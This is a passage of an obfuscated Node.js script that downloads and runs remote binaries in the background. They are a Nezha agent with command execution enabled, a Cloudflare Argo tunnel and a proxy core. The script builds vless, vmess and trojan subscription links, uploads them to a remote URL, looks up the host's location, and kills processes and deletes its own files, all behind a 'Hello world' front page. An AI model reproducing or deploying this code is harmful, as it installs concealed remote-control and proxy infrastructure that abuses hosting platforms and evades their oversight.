    if (_0x1baeb2[_0x5178bc(0x1bd)](NEZHA_SERVER, NEZHA_KEY)) {
        if (NEZHA_PORT) {
            const _0xe5d7f3 = _0x1baeb2[_0x5178bc(0x10d)](_0x1551eb, _0x1baeb2[_0x5178bc(0x1be)]) ? _0x1baeb2[_0x5178bc(0x1db)] : _0x1baeb2[_0x5178bc(0x169)];
            _0x208a02[_0x5178bc(0x31c)]({
                'fileName': npmPath,
                'fileUrl': _0xe5d7f3
            });
        } else {
            const _0x4acae9 = _0x1baeb2[_0x5178bc(0x223)](_0x1551eb, _0x1baeb2[_0x5178bc(0x1be)]) ? _0x1baeb2[_0x5178bc(0x108)] : _0x1baeb2[_0x5178bc(0x1f4)];
            _0x208a02[_0x5178bc(0x31c)]({
                'fileName': phpPath,
                'fileUrl': _0x4acae9
            });
        }
    }
    return _0x208a02;
}
function argoType() {
    const _0x6b7e04 = _0x20aa4b, _0x18e9f6 = {
            'qOFsi': function (_0x14b46b, _0x3a96c1) {
                return _0x14b46b || _0x3a96c1;
            },
            'lLvTZ': _0x6b7e04(0x207) + _0x6b7e04(0x19f) + _0x6b7e04(0x109) + _0x6b7e04(0x1e1) + _0x6b7e04(0x137) + 'ls',
            'jVIRj': _0x6b7e04(0x2f8) + 'et',
            'lUPSq': _0x6b7e04(0x2bb) + 'n',
            'fjLIu': _0x6b7e04(0x119)
        };
    if (_0x18e9f6[_0x6b7e04(0x164)](!ARGO_AUTH, !ARGO_DOMAIN)) {
        console[_0x6b7e04(0x270)](_0x18e9f6[_0x6b7e04(0x27f)]);
        return;
    }
    if (ARGO_AUTH[_0x6b7e04(0x323)](_0x18e9f6[_0x6b7e04(0x23c)])) {
        fs[_0x6b7e04(0x2a8) + _0x6b7e04(0xe8)](path[_0x6b7e04(0x1aa)](FILE_PATH, _0x18e9f6[_0x6b7e04(0x171)]), ARGO_AUTH);
        const _0xe236bf = _0x6b7e04(0x29d) + '\x20' + ARGO_AUTH[_0x6b7e04(0x27c)]('\x22')[0x23c + 0xc8c + -0xebd * 0x1] + (_0x6b7e04(0x1d7) + _0x6b7e04(0x17e) + '\x20') + path[_0x6b7e04(0x1aa)](FILE_PATH, _0x18e9f6[_0x6b7e04(0x171)]) + (_0x6b7e04(0x26e) + _0x6b7e04(0x21e) + _0x6b7e04(0x22e) + _0x6b7e04(0x1f3) + _0x6b7e04(0x29b)) + ARGO_DOMAIN + (_0x6b7e04(0x262) + _0x6b7e04(0x1ad) + _0x6b7e04(0x1ec) + _0x6b7e04(0x141)) + ARGO_PORT + (_0x6b7e04(0xea) + _0x6b7e04(0x2a5) + _0x6b7e04(0x143) + _0x6b7e04(0x1ce) + _0x6b7e04(0x2f6) + _0x6b7e04(0x2e3) + _0x6b7e04(0x120) + _0x6b7e04(0x255) + '\x20');
        fs[_0x6b7e04(0x2a8) + _0x6b7e04(0xe8)](path[_0x6b7e04(0x1aa)](FILE_PATH, _0x18e9f6[_0x6b7e04(0x27a)]), _0xe236bf);
    } else
        console[_0x6b7e04(0x270)](_0x6b7e04(0x27d) + _0x6b7e04(0x15c) + _0x6b7e04(0x21f) + _0x6b7e04(0x2ec) + 't\x20' + ARGO_PORT + (_0x6b7e04(0x231) + _0x6b7e04(0x2ee)));
}
async function extractDomains() {
    const _0x38b0e4 = _0x20aa4b, _0x4a9793 = {
            'bRohM': function (_0x1cb2b0, _0x3d343f) {
                return _0x1cb2b0 === _0x3d343f;
            },
            'tLzzs': _0x38b0e4(0x11b),
            'uuztn': function (_0x23d033, _0x8a3b19) {
                return _0x23d033(_0x8a3b19);
            },
            'ENREt': function (_0x4db2be, _0x52b55e) {
                return _0x4db2be && _0x52b55e;
            },
            'hLYjN': _0x38b0e4(0x207) + 'N:',
            'JEjOn': function (_0x5a57bc, _0x30a3e0) {
                return _0x5a57bc(_0x30a3e0);
            },
            'fmyDS': _0x38b0e4(0x184),
            'BfmMd': _0x38b0e4(0x162),
            'NhxAh': function (_0x412201, _0x402fc4) {
                return _0x412201 > _0x402fc4;
            },
            'QKOtf': _0x38b0e4(0x2a6) + ':',
            'Ezvxv': function (_0x77f74e, _0xda1b47) {
                return _0x77f74e(_0xda1b47);
            },
            'eErho': _0x38b0e4(0x2a6) + _0x38b0e4(0x151) + _0x38b0e4(0x301) + _0x38b0e4(0x277) + _0x38b0e4(0x216) + _0x38b0e4(0x2aa),
            'wxQNj': function (_0x483e1f) {
                return _0x483e1f();
            },
            'PvZeq': function (_0x44c369) {
                return _0x44c369();
            },
            'xrvtN': _0x38b0e4(0xda) + _0x38b0e4(0xe0) + _0x38b0e4(0x187)
        };
    let _0xbc4090;
    if (_0x4a9793[_0x38b0e4(0x291)](ARGO_AUTH, ARGO_DOMAIN))
        _0xbc4090 = ARGO_DOMAIN, console[_0x38b0e4(0x270)](_0x4a9793[_0x38b0e4(0x2c5)], _0xbc4090), await _0x4a9793[_0x38b0e4(0x2c4)](generateLinks, _0xbc4090);
    else
        try {
            const _0x46c641 = fs[_0x38b0e4(0x1c3) + 'nc'](path[_0x38b0e4(0x1aa)](FILE_PATH, _0x4a9793[_0x38b0e4(0xfa)]), _0x4a9793[_0x38b0e4(0x2b9)]), _0x2645e4 = _0x46c641[_0x38b0e4(0x27c)]('\x0a'), _0x1adc8c = [];
            _0x2645e4[_0x38b0e4(0x236)](_0x3f07d0 => {
                const _0x1d873a = _0x38b0e4, _0x128636 = _0x3f07d0[_0x1d873a(0x113)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
                if (_0x128636) {
                    const _0x1b45cb = _0x128636[-0x3 * 0x9ef + 0x20e3 + -0x315];
                    _0x1adc8c[_0x1d873a(0xeb)](_0x1b45cb);
                }
            });
            if (_0x4a9793[_0x38b0e4(0x15e)](_0x1adc8c[_0x38b0e4(0x139)], -0x1950 + -0x1b * -0x161 + -0xbeb))
                _0xbc4090 = _0x1adc8c[-0x2009 + 0x49 * -0x5f + 0x3b20], console[_0x38b0e4(0x270)](_0x4a9793[_0x38b0e4(0x240)], _0xbc4090), await _0x4a9793[_0x38b0e4(0x254)](generateLinks, _0xbc4090);
            else {
                console[_0x38b0e4(0x270)](_0x4a9793[_0x38b0e4(0xe1)]), fs[_0x38b0e4(0x1a8)](path[_0x38b0e4(0x1aa)](FILE_PATH, _0x4a9793[_0x38b0e4(0xfa)]));
                async function _0x5e088e() {
                    const _0x35af0e = _0x38b0e4;
                    try {
                        _0x4a9793[_0x35af0e(0x19a)](process[_0x35af0e(0x2ca)], _0x4a9793[_0x35af0e(0x208)]) ? await _0x4a9793[_0x35af0e(0x13c)](exec, _0x35af0e(0x16c) + _0x35af0e(0x2f2) + botName + (_0x35af0e(0x166) + _0x35af0e(0x27e))) : await _0x4a9793[_0x35af0e(0x13c)](exec, _0x35af0e(0x220) + '[' + botName[_0x35af0e(0x215)](-0x1f99 + 0x712 * 0x1 + 0x111 * 0x17) + ']' + botName[_0x35af0e(0x2d0)](0x2cc * 0x8 + -0x822 * -0x3 + -0x2ec5) + (_0x35af0e(0x302) + _0x35af0e(0x26b)));
                    } catch (_0x24fcff) {
                    }
                }
                _0x4a9793[_0x38b0e4(0x248)](_0x5e088e), await new Promise(_0x5f093b => setTimeout(_0x5f093b, 0x7da + -0x1876 + 0x2 * 0xe2a));
                const _0x5cea9e = _0x38b0e4(0x117) + _0x38b0e4(0x1d2) + _0x38b0e4(0x103) + _0x38b0e4(0x20a) + _0x38b0e4(0x1c9) + _0x38b0e4(0x1a4) + _0x38b0e4(0x2b3) + _0x38b0e4(0x12b) + FILE_PATH + (_0x38b0e4(0x228) + _0x38b0e4(0x1ae) + _0x38b0e4(0x26a) + _0x38b0e4(0xdc) + _0x38b0e4(0x174)) + ARGO_PORT;
                try {
                    await _0x4a9793[_0x38b0e4(0x254)](exec, _0x38b0e4(0x2ce) + botPath + '\x20' + _0x5cea9e + (_0x38b0e4(0x1ba) + _0x38b0e4(0x2f7))), console[_0x38b0e4(0x270)](botName + (_0x38b0e4(0x1af) + 'g')), await new Promise(_0x455d1c => setTimeout(_0x455d1c, -0x821 + -0x5 * -0x61 + -0x17f * -0xc)), await _0x4a9793[_0x38b0e4(0x271)](extractDomains);
                } catch (_0x3ceb86) {
                    console[_0x38b0e4(0x15a)](_0x38b0e4(0x1f9) + _0x38b0e4(0x1ca) + _0x38b0e4(0x2fb) + _0x3ceb86);
                }
            }
        } catch (_0x3e4d90) {
            console[_0x38b0e4(0x15a)](_0x4a9793[_0x38b0e4(0xf0)], _0x3e4d90);
        }
}
async function getMetaInfo() {
    const _0x206070 = _0x20aa4b, _0x45c475 = {
            'XyKgd': _0x206070(0x2f3) + _0x206070(0x295) + _0x206070(0x1c4),
            'wHJwA': _0x206070(0x2cb) + '0',
            'VhAIo': _0x206070(0x273) + _0x206070(0x278) + 'on',
            'WDhWY': function (_0x3e76e6, _0x63298e) {
                return _0x3e76e6 === _0x63298e;
            },
            'WqniX': _0x206070(0x2e5),
            'zYRJG': _0x206070(0x2d1)
        };
    try {
        const _0x2550c2 = await axios[_0x206070(0x2e6)](_0x45c475[_0x206070(0x2b5)], {
            'headers': {
                'User-Agent': _0x45c475[_0x206070(0x299)],
                'timeout': 0xbb8
            }
        });
        if (_0x2550c2[_0x206070(0x29a)] && _0x2550c2[_0x206070(0x29a)][_0x206070(0x263) + 'de'] && _0x2550c2[_0x206070(0x29a)][_0x206070(0x214)])
            return (_0x2550c2[_0x206070(0x29a)][_0x206070(0x263) + 'de'] + '-' + _0x2550c2[_0x206070(0x29a)][_0x206070(0x214)])[_0x206070(0x19e)](/\s+/g, '_');
    } catch (_0x3b347d) {
        try {
            const _0x3dbe7c = await axios[_0x206070(0x2e6)](_0x45c475[_0x206070(0x13e)], {
                'headers': {
                    'User-Agent': _0x45c475[_0x206070(0x299)],
                    'timeout': 0xbb8
                }
            });
            if (_0x3dbe7c[_0x206070(0x29a)] && _0x45c475[_0x206070(0x140)](_0x3dbe7c[_0x206070(0x29a)][_0x206070(0x300)], _0x45c475[_0x206070(0x128)]) && _0x3dbe7c[_0x206070(0x29a)][_0x206070(0x1d3) + 'e'] && _0x3dbe7c[_0x206070(0x29a)][_0x206070(0x2fd)])
                return (_0x3dbe7c[_0x206070(0x29a)][_0x206070(0x1d3) + 'e'] + '-' + _0x3dbe7c[_0x206070(0x29a)][_0x206070(0x2fd)])[_0x206070(0x19e)](/\s+/g, '_');
        } catch (_0x4f1249) {
        }
    }
    return _0x45c475[_0x206070(0x1de)];
}
async function generateLinks(_0x23cde6) {
    const _0x200d3d = _0x20aa4b, _0x5f1b13 = {
            'tvRaH': _0x200d3d(0x221),
            'HWPUU': _0x200d3d(0x26f),
            'cnxTT': _0x200d3d(0x239) + _0x200d3d(0x1ed),
            'LhryG': _0x200d3d(0x2ea),
            'yyZdf': _0x200d3d(0x280),
            'FDXJf': _0x200d3d(0x192),
            'DATtG': function (_0x39df75) {
                return _0x39df75();
            },
            'dWopF': function (_0x597cb2, _0x407f94) {
                return _0x597cb2(_0x407f94);
            },
            'czdGo': function (_0x451951, _0x2c5bf5, _0x3938a0) {
                return _0x451951(_0x2c5bf5, _0x3938a0);
            },
            'WrffH': function (_0x3b8db8) {
                return _0x3b8db8();
            }
        }, _0x3eb45b = await _0x5f1b13[_0x200d3d(0x24e)](getMetaInfo), _0x11ed2d = NAME ? NAME + '-' + _0x3eb45b : _0x3eb45b;
    return new Promise(_0x5132f9 => {
        const _0x1f5674 = _0x200d3d;
        _0x5f1b13[_0x1f5674(0x163)](setTimeout, () => {
            const _0x4f7216 = _0x1f5674, _0x1de556 = {
                    'v': '2',
                    'ps': '' + _0x11ed2d,
                    'add': CFIP,
                    'port': CFPORT,
                    'id': UUID,
                    'aid': '0',
                    'scy': _0x5f1b13[_0x4f7216(0x1b2)],
                    'net': 'ws',
                    'type': _0x5f1b13[_0x4f7216(0x19c)],
                    'host': _0x23cde6,
                    'path': _0x5f1b13[_0x4f7216(0x1a1)],
                    'tls': _0x5f1b13[_0x4f7216(0x312)],
                    'sni': _0x23cde6,
                    'alpn': '',
                    'fp': _0x5f1b13[_0x4f7216(0x292)]
                }, _0x2e7a92 = _0x4f7216(0x242) + UUID + '@' + CFIP + ':' + CFPORT + (_0x4f7216(0x279) + _0x4f7216(0x191) + _0x4f7216(0x1eb) + _0x4f7216(0x2d7)) + _0x23cde6 + (_0x4f7216(0x258) + _0x4f7216(0x25b) + _0x4f7216(0x2b2)) + _0x23cde6 + (_0x4f7216(0x1fc) + _0x4f7216(0x1d5) + _0x4f7216(0x1f1) + '0#') + _0x11ed2d + _0x4f7216(0x259) + Buffer[_0x4f7216(0x1f7)](JSON[_0x4f7216(0x24d)](_0x1de556))[_0x4f7216(0x2cc)](_0x5f1b13[_0x4f7216(0x2ac)]) + (_0x4f7216(0x180) + '/') + UUID + '@' + CFIP + ':' + CFPORT + (_0x4f7216(0xd4) + _0x4f7216(0x2a1)) + _0x23cde6 + (_0x4f7216(0x258) + _0x4f7216(0x25b) + _0x4f7216(0x2b2)) + _0x23cde6 + (_0x4f7216(0x12f) + _0x4f7216(0x125) + _0x4f7216(0x310) + _0x4f7216(0x2be)) + _0x11ed2d + _0x4f7216(0x298);
            console[_0x4f7216(0x270)](Buffer[_0x4f7216(0x1f7)](_0x2e7a92)[_0x4f7216(0x2cc)](_0x5f1b13[_0x4f7216(0x2ac)])), fs[_0x4f7216(0x2a8) + _0x4f7216(0xe8)](subPath, Buffer[_0x4f7216(0x1f7)](_0x2e7a92)[_0x4f7216(0x2cc)](_0x5f1b13[_0x4f7216(0x2ac)])), console[_0x4f7216(0x270)](FILE_PATH + (_0x4f7216(0x2ae) + _0x4f7216(0x157) + _0x4f7216(0x2d8))), subContent = Buffer[_0x4f7216(0x1f7)](_0x2e7a92)[_0x4f7216(0x2cc)](_0x5f1b13[_0x4f7216(0x2ac)]), _0x5f1b13[_0x4f7216(0x150)](uploadNodes), _0x5f1b13[_0x4f7216(0x21d)](_0x5132f9, _0x2e7a92);
        }, -0x2138 + -0x2603 * -0x1 + -0x1 * -0x305);
    });
}
async function uploadNodes() {
    const _0x54b25a = _0x20aa4b, _0x4b182b = {
            'XWsTB': function (_0x3ca6b6, _0x1e98fd) {
                return _0x3ca6b6 && _0x1e98fd;
            },
            'rBXeH': _0x54b25a(0x20b) + _0x54b25a(0x181),
            'hBdMx': function (_0x3f4697, _0x19c7b2) {
                return _0x3f4697 === _0x19c7b2;
            },
            'HjOgV': _0x54b25a(0x165) + _0x54b25a(0x20c) + _0x54b25a(0x2cf) + _0x54b25a(0x1d0),
            'CYZIc': _0x54b25a(0x162),
            'WagtB': _0x54b25a(0x17c) + _0x54b25a(0x2c3) + _0x54b25a(0x2d8)
        };
    if (_0x4b182b[_0x54b25a(0x176)](UPLOAD_URL, PROJECT_URL)) {
        const _0x13d4a1 = PROJECT_URL + '/' + SUB_PATH, _0x9f7abb = { 'subscription': [_0x13d4a1] };
        try {
            const _0x658e8f = await axios[_0x54b25a(0xfd)](UPLOAD_URL + (_0x54b25a(0x28f) + _0x54b25a(0x284) + 'ns'), _0x9f7abb, { 'headers': { 'Content-Type': _0x4b182b[_0x54b25a(0x15f)] } });
            return _0x658e8f && _0x4b182b[_0x54b25a(0x1c0)](_0x658e8f[_0x54b25a(0x300)], -0x1029 + -0x3 * 0x687 + 0x2486) ? (console[_0x54b25a(0x270)](_0x4b182b[_0x54b25a(0x210)]), _0x658e8f) : null;
        } catch (_0x4b1401) {
            if (_0x4b1401[_0x54b25a(0x16d)]) {
                if (_0x4b182b[_0x54b25a(0x1c0)](_0x4b1401[_0x54b25a(0x16d)][_0x54b25a(0x300)], -0x1182 + 0x2b5 + -0x3b * -0x47)) {
                }
            }
        }
    } else {
        if (UPLOAD_URL) {
            if (!fs[_0x54b25a(0x304)](listPath))
                return;
            const _0x4e6622 = fs[_0x54b25a(0x1c3) + 'nc'](listPath, _0x4b182b[_0x54b25a(0x267)]), _0x18e172 = _0x4e6622[_0x54b25a(0x27c)]('\x0a')[_0x54b25a(0x199)](_0x302703 => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x54b25a(0xe7)](_0x302703));
            if (_0x4b182b[_0x54b25a(0x1c0)](_0x18e172[_0x54b25a(0x139)], 0x18a1 + -0x128 * -0xd + -0x30d * 0xd))
                return;
            const _0x2c6688 = JSON[_0x54b25a(0x24d)]({ 'nodes': _0x18e172 });
            try {
                const _0x3f1094 = await axios[_0x54b25a(0xfd)](UPLOAD_URL + (_0x54b25a(0x179) + _0x54b25a(0x241)), _0x2c6688, { 'headers': { 'Content-Type': _0x4b182b[_0x54b25a(0x15f)] } });
                return _0x3f1094 && _0x4b182b[_0x54b25a(0x1c0)](_0x3f1094[_0x54b25a(0x300)], 0x6be * -0x1 + 0x25f * -0x5 + 0x29 * 0x79) ? (console[_0x54b25a(0x270)](_0x4b182b[_0x54b25a(0x2d4)]), _0x3f1094) : null;
            } catch (_0x350901) {
                return null;
            }
        } else
            return;
    }
}
function _0x206e(_0xa6a912, _0x7acb81) {
    const _0x20d41b = _0x20c9();
    return _0x206e = function (_0x440275, _0x13967a) {
        _0x440275 = _0x440275 - (0x1bdb + 0x1989 + -0x1a48 * 0x2);
        let _0x11acf3 = _0x20d41b[_0x440275];
        return _0x11acf3;
    }, _0x206e(_0xa6a912, _0x7acb81);
}
function _0x20c9() {
    const _0x23e5e7 = [
        's.org',
        'ent\x20archit',
        '2087',
        '\x0aclient_se',
        '\x0adebug:\x20fa',
        'filter',
        'bRohM',
        'ng\x20on\x20port',
        'HWPUU',
        '5|6|0|2|1|',
        'replace',
        'N\x20or\x20ARGO_',
        'php\x20runnin',
        'cnxTT',
        'Download\x20',
        'pipe',
        'otocol\x20htt',
        'on\x20content',
        'NEZHA\x20vari',
        'Skipping\x20a',
        'unlinkSync',
        '\x0atls:\x20',
        'join',
        'FILE_PATH',
        'fileName',
        'vice:\x20http',
        '--loglevel',
        '\x20is\x20runnin',
        't-delay\x204\x20',
        'JcHSH',
        'tvRaH',
        'TnpJM1lXUm',
        'Hello\x20worl',
        'fVLxI',
        '\x20already\x20e',
        'LvbhI',
        'qCWau',
        'sable_nat:',
        '\x20>/dev/nul',
        'npm\x20runnin',
        '4\x0aserver:\x20',
        'iieHY',
        'bxkdQ',
        'Not\x20Found',
        'hBdMx',
        'id:\x20',
        'listen',
        'readFileSy',
        'oip',
        'r\x20the\x20curr',
        'dPaNm',
        '--config\x20',
        't\x20success\x20',
        'pdate\x20--pr',
        'uting\x20comm',
        'rt_delay:\x20',
        'ZmZmE0NjJj',
        'untry_code',
        'noTLSVerif',
        'map',
        'ully',
        'text/html;',
        'dge-ip-ver',
        'countryCod',
        'YNYkc',
        'less-argo%',
        'Can\x27t\x20find',
        '\x0a\x20\x20credent',
        '\x20-p\x20',
        'Empowermen',
        'NWI4LWIwZG',
        'SwnUX',
        'http',
        '2083',
        'zYRJG',
        'bWUuk',
        'list.txt',
        'pty,\x20use\x20q',
        'YBtWB',
        'ingbo.dpdn',
        'basename',
        'rJnEy',
        'aarch64',
        'BczJI',
        'd:\x20',
        'false',
        'ure:\x20false',
        'urity=tls&',
        '://localho',
        'o?ed=2560',
        'NEZHA_KEY',
        '\x20false\x0adis',
        'r\x20is\x20runni',
        '3Fed%3D256',
        'ZHLeg',
        's:\x0a\x20\x20\x20\x20-\x20h',
        'txrDL',
        'https://ar',
        'fileUrl',
        'from',
        't,\x20enjoy!',
        'Error\x20exec',
        'vmess',
        'SERVER_POR',
        '&path=%2Fv',
        'tartserver',
        'er.',
        '\x20again\x20lat',
        'child_proc',
        'MuYQZ',
        'UnWEH',
        'message',
        '\x20a\x20file\x20fo',
        'yHJla',
        'net/add-ur',
        'ARGO_DOMAI',
        'tLzzs',
        'eAeMl',
        '--no-autou',
        'applicatio',
        'on\x20uploade',
        'mmand_exec',
        'utf8',
        'close',
        'HjOgV',
        'for\x20',
        'AiHJe',
        'YGUFp',
        'isp',
        'charAt',
        'obtain\x20Arg',
        'https+loca',
        'hUGhr',
        'mkdirSync',
        'dcdeploy.t',
        'cret:\x20',
        'LvWhM',
        'dWopF',
        'l:\x20http2\x0a\x20',
        'to\x20tunnel,',
        'pkill\x20-f\x20\x22',
        'auto',
        '443',
        'TPZBY',
        'path',
        'eGbEo',
        'NEZHA_SERV',
        'JyMgw',
        '/boot.log\x20',
        'MFKSb',
        'ARGO_AUTH',
        'chmod',
        '1598096kEJtJn',
        '--skip-con',
        '\x20\x0a\x20\x20ingres',
        'tic\x20access',
        'EnaZk',
        '\x20in\x20clouud',
        'k\x20added\x20su',
        'catch',
        'jMbRy',
        'tf-8',
        'forEach',
        '--tls',
        'd!<br><br>',
        '/vmess-arg',
        'arm',
        'loading\x20fi',
        'jVIRj',
        'ecture',
        'd64.ssss.n',
        'UiLCJ0Ijoi',
        'QKOtf',
        'odes',
        '\x0avless://',
        'yc.mn/web',
        'exec',
        'arm64',
        'NEZHA_PORT',
        '127.0.0.1',
        'wxQNj',
        'ull\x202>&1\x20&',
        'qWuha',
        'pty,skip\x20r',
        'yquXj',
        'stringify',
        'WrffH',
        'blackhole',
        '2096',
        'yLQDF',
        '2kRlgZP',
        'vless',
        'Ezvxv',
        'atus:404\x0a\x20',
        '2053',
        'oPrmM',
        '&fp=firefo',
        '\x0a\x0avmess://',
        'uACUq',
        'x&type=ws&',
        '15010pDnjEk',
        'readdirSyn',
        'index.html',
        'xtls-rprx-',
        'Thank\x20you\x20',
        '_to_upgrad',
        '\x0a\x20\x20\x20\x20\x20\x20ser',
        'country_co',
        'MaOYT',
        'n\x20--skip-p',
        'CFPORT',
        'CYZIc',
        'RFlJX',
        'I2NTlmNDA4',
        '\x20info\x20--ur',
        'ull\x202>&1',
        'ODA0M2QyIi',
        'able\x20is\x20em',
        '\x0a\x20\x20protoco',
        'none',
        'log',
        'PvZeq',
        '_PATH}(Def',
        'http://ip-',
        'floor',
        'lse\x0ainsecu',
        'isFile',
        'ng\x20bot\x20to\x20',
        'api.com/js',
        '?encryptio',
        'fjLIu',
        '0f5999',
        'split',
        'Using\x20toke',
        '\x202>&1',
        'lLvTZ',
        'firefox',
        'oo.serv00.',
        'dcdploy',
        'statSync',
        'ubscriptio',
        '/tunnel.ym',
        '4|3',
        '\x20not\x20yet\x20a',
        'count:\x20tru',
        'end',
        'aTvsy',
        'abcdefghij',
        'yc.mn/agen',
        'pop',
        'matic\x20acce',
        '/api/add-s',
        'query:\x20fal',
        'ENREt',
        'yyZdf',
        'quic',
        'f38-00aadc',
        'i.ip.sb/ge',
        'sub.txt',
        'please\x20try',
        '\x0a\x20\x20\x20\x20',
        'wHJwA',
        'data',
        'ostname:\x20',
        'FQmzu',
        '\x0a\x20\x20tunnel:',
        'sxxNo',
        'App\x20is\x20run',
        'XBjFY',
        'tls&sni=',
        'yc.mn/v1',
        'QtOGM2MC00',
        'https://am',
        'ginRequest',
        'ArgoDomain',
        'te\x20--repor',
        'writeFileS',
        'axios',
        'oDomain',
        'util',
        'FDXJf',
        'e:\x20false\x0au',
        '/sub.txt\x20s',
        '/vless-arg',
        'Quuni',
        'DxJyy',
        'host=',
        'p2\x20--logfi',
        'YTVhODFiZT',
        'XyKgd',
        '\x0adisable_f',
        'nXsyG',
        'jiLtD',
        'BfmMd',
        'zObKO',
        'tunnel.jso',
        'readFile',
        'stream',
        '60#',
        'se\x0agpu:\x20fa',
        'ate:\x20true\x0a',
        '978300FDbVcO',
        'all',
        'aded\x20succe',
        'JEjOn',
        'hLYjN',
        'nVCcv',
        'hZzgH',
        'e\x0atemperat',
        'e:\x20true\x0adi',
        'platform',
        'Mozilla/5.',
        'toString',
        'able_send_',
        'nohup\x20',
        'd\x20successf',
        'substring',
        'Unknown',
        'cess\x20/{SUB',
        'dYbzt',
        'WagtB',
        'yc.mn/bot',
        'e-nodes',
        'sni=',
        'ssfully',
        'CKPhy',
        'oXwJM',
        'createWrit',
        'AhcIg',
        'KHYNa',
        'Egafu',
        'uvwxyz',
        'You\x20can\x20ac',
        'fXsxA',
        'null\x202>&1\x20',
        '\x20\x20-\x20servic',
        '/api/delet',
        'success',
        'get',
        'automatic\x20',
        '8443',
        'se_ipv6_co',
        'tls',
        'del\x20/f\x20/q\x20',
        '\x20please\x20se',
        'ccessfully',
        'flare',
        'config.yam',
        'config.jso',
        'rocs\x20>/dev',
        'f\x20/im\x20',
        'https://ap',
        'lly',
        '/config.ya',
        'y:\x20true\x0a\x20\x20',
        'l\x202>&1\x20&',
        'TunnelSecr',
        'block',
        'then',
        'and:\x20',
        'gjLrn',
        'org',
        'our\x20nodes!',
        ':\x20false\x0auu',
        'status',
        ',\x20re-runni',
        '\x22\x20>\x20/dev/n',
        'pRcPh',
        'existsSync',
        'Error\x20in\x20s',
        'aTAwTURsbU',
        'env',
        'eEEWV',
        '/dev/null',
        'CFIP',
        'LwtHy',
        'NDc0MTEwZm',
        'ection_cou',
        'IpEZc',
        'unlink',
        '%3Fed%3D25',
        't\x20failed\x20f',
        'LhryG',
        'nRuMU',
        'jCBdg',
        'true',
        'klmnopqrst',
        'on\x20>/dev/n',
        'writeHead',
        '7QhosqD',
        'OhPtb',
        'trojan',
        'unshift',
        '\x20successfu',
        'ault:\x20/sub',
        'NAME',
        '/null\x202>&1',
        'cRsup',
        'PlwZo',
        'includes',
        'ess',
        '?security=',
        'OWM5NTQxNj',
        '8/dns-quer',
        'NSJ9',
        'lOOmA',
        'freedom',
        'Error\x20read',
        'oken\x20',
        'l\x20http://l',
        'e_auto_upd',
        '\x0askip_conn',
        'saas.sin.f',
        'ing\x20boot.l',
        'eErho',
        'access\x20tas',
        'arch',
        'ml\x22\x20>/dev/',
        'uwzuZ',
        'nuhZr',
        'test',
        'ync',
        'createServ',
        '\x0a\x20\x20\x20\x20\x20\x20ori',
        'push',
        'ute:\x20false',
        'UFGRH',
        'rm\x20-rf\x20',
        '\x201800\x0arepo',
        'xrvtN',
        '-auto-upda',
        'eyJhIjoiY2',
        'nt:\x20true\x0as',
        'WqJxy',
        '\x20-c\x20',
        'GTcym',
        '\x20is\x20create',
        'g\x20error:\x20',
        'zFJLp',
        'fmyDS',
        're_tls:\x20tr',
        '9990GXNyKM',
        'post',
        'UPLOAD_URL',
        'tcp',
        'unning',
        '/config.js',
        'byhXh',
        'sion\x20auto\x20',
        'vailable,\x20',
        'SUB_PATH',
        'https://oo',
        '\x20-s\x20',
        'LrqPz',
        'AUTH\x20is\x20em',
        'NJhZO',
        'web\x20runnin',
        'direct',
        'QylyZ',
        'Dinpj',
        'm64.ssss.n',
        '/trojan-ar',
        '1aR1UwTnpF',
        '\x20charset=u',
        'match',
        'xists',
        'EIoFm',
        '304044oPsTTs',
        'tunnel\x20--e',
        'XHwrD',
        'tunnel.yml',
        'orce_updat',
        'win32',
        'text/plain',
        'smvkC',
        'UUID',
        'for\x20using\x20',
        'e:\x20http_st',
        ')\x20to\x20get\x20y',
        'l\x202>&1',
        'AUTO_ACCES',
        'nNmMQ',
        'rojan-argo',
        '\x20>\x20nul\x202>&',
        '7a2-410f-a',
        'WqniX',
        'this\x20scrip',
        'or\x20',
        'le\x20',
        'hkSil',
        'RwYWu',
        'ning',
        '&path=%2Ft',
        'HltTl',
        '\x20failed:\x20',
        'ehDPP',
        '\x20-c\x20\x22',
        ';\x20charset=',
        'PROJECT_UR',
        'vision',
        'uick\x20tunne',
        'PORT',
        'length',
        '\x20task\x20fail',
        'Unhandled\x20',
        'uuztn',
        'clear',
        'VhAIo',
        'l://8.8.8.',
        'WDhWY',
        'st:',
        '\x20--disable',
        ':\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
        'arMMc',
        'ARGO_PORT',
        'KmLtw',
        'UXdOVGRoWk',
        'rt_period:',
        'error\x20in\x20s',
        'lse\x0adisabl',
        'QtZGVmZDRi',
        'eStream',
        'OkKUc',
        'les:',
        'Add\x20automa',
        'DATtG',
        '\x20not\x20found',
        'pzroR',
        'ss\x20task',
        'wicyI6Ik5U',
        'QHkHf',
        'has',
        'aved\x20succe',
        'jQYuC',
        'vRuLG',
        'error',
        'amd',
        'n\x20connect\x20',
        'bAQPw',
        'NhxAh',
        'rBXeH',
        '544835BvnmHg',
        'finish',
        'utf-8',
        'czdGo',
        'qOFsi',
        'Subscripti',
        '.exe\x20>\x20nul',
        'p2\x20run\x20--t',
        'Error\x20down',
        'yxOJK',
        'MnIsH',
        '9922784LBExzW',
        'taskkill\x20/',
        'response',
        'url',
        'kip_procs_',
        'random',
        'lUPSq',
        'f862cbb4-9',
        'lang',
        'ocalhost:',
        'BILVe',
        'XWsTB',
        '\x0ause_gitee',
        'qlfNA',
        '/api/add-n',
        'yxpyp',
        'mzQXU',
        'Nodes\x20uplo',
        'ue\x0aip_repo',
        'ials-file:',
        'TtjGE',
        '\x0a\x0atrojan:/',
        'n/json',
        'l\x20run',
        '.tmp',
        'boot.log',
        'dding\x20auto',
        'disable_co',
        'og:',
        '7841088laZByF',
        'ksMJj',
        'xTsRK',
        'vHTHW',
        'cHBPk',
        'dJdE1EUTRZ',
        'xUZzFOVFV0',
        'http\x20serve',
        'promises',
        'n=none&sec',
        'base64',
        'OVEnU'
    ];
    _0x20c9 = function () {
        return _0x23e5e7;
    };
    return _0x20c9();
}
function cleanFiles() {
    const _0x3d0b0c = _0x20aa4b, _0x576820 = {
            'bAQPw': _0x3d0b0c(0x29f) + _0x3d0b0c(0x12e),
            'KmLtw': _0x3d0b0c(0x260) + _0x3d0b0c(0x11f) + _0x3d0b0c(0x129) + _0x3d0b0c(0x1f8),
            'vRuLG': function (_0x58405b, _0x223f6e) {
                return _0x58405b && _0x223f6e;
            },
            'jiLtD': function (_0x7f75b6, _0x47eaf6) {
                return _0x7f75b6 === _0x47eaf6;
            },
